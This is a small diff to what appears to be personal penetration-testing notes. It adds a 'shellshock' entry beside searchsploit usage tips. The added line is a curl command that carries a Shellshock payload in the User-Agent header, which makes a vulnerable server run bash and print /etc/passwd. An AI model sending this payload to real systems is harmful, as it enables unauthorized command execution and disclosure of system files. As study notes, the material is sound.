@@ -1,5 +1,9 @@
 searchsploit SOMETHING
 
+shellshock
+
+curl -H "user-agent:() {:;};echo; /bin/bash -c 'cat /etc/passwd'"
+
 to copy into working directory
 searchsploit -m EXPLOIT
 
